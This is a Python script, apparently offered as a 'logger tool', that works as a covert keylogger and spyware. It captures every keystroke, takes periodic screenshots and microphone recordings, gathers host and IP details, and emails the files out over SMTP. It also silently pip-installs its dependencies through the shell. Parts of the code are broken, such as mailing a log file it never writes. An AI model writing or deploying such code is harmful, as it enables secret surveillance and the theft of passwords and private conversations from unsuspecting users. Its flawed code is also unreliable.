try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot as screen_capture
    import sounddevice as audio_device
    from pynput import keyboard
    from pynput.keyboard import Listener
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    from email.mime.base import MIMEBase
    from email import encoders
except ModuleNotFoundError:
    from subprocess import call
    required_modules = ["pyscreenshot", "sounddevice", "pynput"]
    call("pip install " + ' '.join(required_modules), shell=True)

finally:
    USER_EMAIL = "example_user"
    USER_PASSWORD = "example_password"
    REPORT_INTERVAL = 60  # in seconds

    class LoggerTool:
        def __init__(self, interval, user_email, user_password):
            self.interval = interval
            self.log_data = "Logger Initialized..."
            self.email = user_email
            self.password = user_password

        def add_to_log(self, data):
            self.log_data += data

        def record_keystroke(self, key_event):
            try:
                key_logged = str(key_event.char)
            except AttributeError:
                if key_event == key_event.space:
                    key_logged = "SPACE"
                elif key_event == key_event.esc:
                    key_logged = "ESC"
                else:
                    key_logged = f" [{key_event}] "

            self.add_to_log(key_logged)

        def capture_screenshot(self):
            image = screen_capture.grab()
            image.save("screenshot.png")
            self.send_file_via_email("screenshot.png")

        def capture_audio(self):
            sample_rate = 44100
            duration = REPORT_INTERVAL
            recording = audio_device.rec(int(duration * sample_rate), samplerate=sample_rate, channels=2)
            audio_device.wait()
            with wave.open('audio_record.wav', 'wb') as audio_file:
                audio_file.setnchannels(2)
                audio_file.setsampwidth(2)
                audio_file.setframerate(sample_rate)
                audio_file.writeframes(recording.tobytes())
            self.send_file_via_email("audio_record.wav")

        def collect_system_info(self):
            hostname = socket.gethostname()
            ip_address = socket.gethostbyname(hostname)
            details = f"""
            Hostname: {hostname}
            IP Address: {ip_address}
            Processor: {platform.processor()}
            System: {platform.system()}
            Architecture: {platform.architecture()}
            """
            self.add_to_log(details)

        def send_file_via_email(self, file_path):
            message = MIMEMultipart()
            message['From'] = self.email
            message['To'] = self.email
            message['Subject'] = "Logger Report"

            with open(file_path, "rb") as attachment:
                file_part = MIMEBase('application', 'octet-stream')
                file_part.set_payload(attachment.read())
                encoders.encode_base64(file_part)
                file_part.add_header(
                    'Content-Disposition',
                    f'attachment; filename= {os.path.basename(file_path)}',
                )
                message.attach(file_part)

            try:
                with smtplib.SMTP('smtp.mailtrap.io', 2525) as server:
                    server.login(self.email, self.password)
                    server.send_message(message)
            except Exception as e:
                self.add_to_log(f"Error sending email: {e}")

        def periodic_report(self):
            self.capture_screenshot()
            self.capture_audio()
            self.collect_system_info()
            self.send_file_via_email("log_data.txt")
            threading.Timer(self.interval, self.periodic_report).start()

        def run_logger(self):
            with Listener(on_press=self.record_keystroke) as listener:
                self.periodic_report()
                listener.join()

    logger = LoggerTool(REPORT_INTERVAL, USER_EMAIL, USER_PASSWORD)
    logger.run_logger()
